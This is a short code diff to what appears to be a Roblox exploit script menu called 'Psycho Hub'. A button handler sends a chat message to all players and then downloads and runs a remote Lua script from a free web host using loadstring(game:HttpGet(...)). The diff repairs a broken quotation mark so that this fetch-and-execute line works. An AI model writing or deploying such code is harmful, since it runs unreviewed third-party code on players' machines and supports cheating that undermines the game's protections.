@@ -141,7 +141,8 @@ _2take1tk.MouseButton1Down:connect(function()
 	local A_2 = "All"
 	local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
 	Event:FireServer(A_1, A_2)
-	loadstring(game:HttpGet("https://avascripting.000webhostapp.com/2take1.tk))() -- KEY Zacky771
+          -- 2take1.tk script
+loadstring(game:HttpGet("https://avascripting.000webhostapp.com/2take1.tk"))()
 end)
 
 PsychoHub.Name = "Psycho Hub"
